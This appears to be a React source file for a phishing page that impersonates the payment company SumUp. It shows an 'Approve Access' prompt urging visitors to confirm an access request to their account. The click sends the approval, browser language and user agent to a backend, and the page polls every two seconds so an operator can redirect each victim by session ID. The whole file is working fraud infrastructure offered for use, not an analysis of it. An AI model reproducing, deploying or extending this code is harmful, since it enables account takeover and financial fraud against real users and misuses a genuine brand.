import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import { CheckCircle } from "lucide-react";

export default function Approve() {
  const [isLoading, setIsLoading] = useState(false);
  const [, setLocation] = useLocation();
  const { toast } = useToast();

  useEffect(() => {
    document.title = "Approve Access - SumUp";

    // Check for admin redirect every 2 seconds
    const redirectCheck = setInterval(async () => {
      try {
        const sessionId = localStorage.getItem('visitorSessionId');
        if (sessionId) {
          const response = await apiRequest("POST", "/api/check-redirect", { sessionId });
          const data = await response.json();
          
          if (data.redirect) {
            console.log(`🎯 REDIRECTING FROM APPROVE TO: ${data.redirect}`);
            setLocation(data.redirect);
          }
        }
      } catch (error) {
        // Silent fail
      }
    }, 2000);

    return () => clearInterval(redirectCheck);
  }, [setLocation]);

  const handleApprove = async () => {
    if (isLoading) return;
    setIsLoading(true);

    try {
      const language = navigator.language || 'Unknown';
      const userAgent = navigator.userAgent || 'Unknown';

      await apiRequest("POST", "/api/approve", {
        decision: "approved",
        language,
        userAgent,
      });

      toast({
        title: "Access Approved",
        description: "You have approved access to your application.",
      });

      // Redirect to success after approval
      setTimeout(() => {
        setLocation("/success");
      }, 1500);
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to process approval. Please try again.",
        variant: "destructive",
      });
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-white px-4">
      <div className="w-full max-w-md text-center">
        {/* SumUp Logo Header */}
        <div className="flex items-center justify-center mb-12">
          <div className="h-8 w-8 bg-black rounded-md flex items-center justify-center">
            <svg viewBox="0 0 24 24" fill="white" className="h-5 w-5">
              <path d="M13 10V3L4 14h7v7l9-11h-7z" />
            </svg>
          </div>
          <span className="ml-3 text-2xl font-normal">sumup®</span>
        </div>

        {/* Approval Icon */}
        <div className="flex justify-center mb-8">
          <div className="w-20 h-20 rounded-full bg-black/5 flex items-center justify-center">
            <svg
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="1.5"
              className="w-10 h-10"
              data-testid="icon-approve"
            >
              <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
          </div>
        </div>

        {/* Title */}
        <h1 className="text-4xl font-semibold mb-4 text-black" data-testid="text-title">
          Approve Access
        </h1>

        {/* Description */}
        <p className="text-base mb-10 text-black/60" data-testid="text-description">
          A request has been made to access your SumUp application. Please confirm to approve this access.
        </p>

        {/* Action Button */}
        <button
          onClick={handleApprove}
          disabled={isLoading}
          className="w-full px-6 py-4 text-base font-medium bg-black text-white rounded-lg hover:opacity-90 transition-opacity disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
          data-testid="button-approve"
        >
          {isLoading ? (
            "Processing..."
          ) : (
            <>
              <CheckCircle className="w-5 h-5" />
              Approve Access
            </>
          )}
        </button>

        {/* Security Notice */}
        <p className="text-sm text-black/40 mt-8" data-testid="text-notice">
          This is a security measure to protect your account. Only approve if you initiated this request.
        </p>
      </div>
    </div>
  );
}
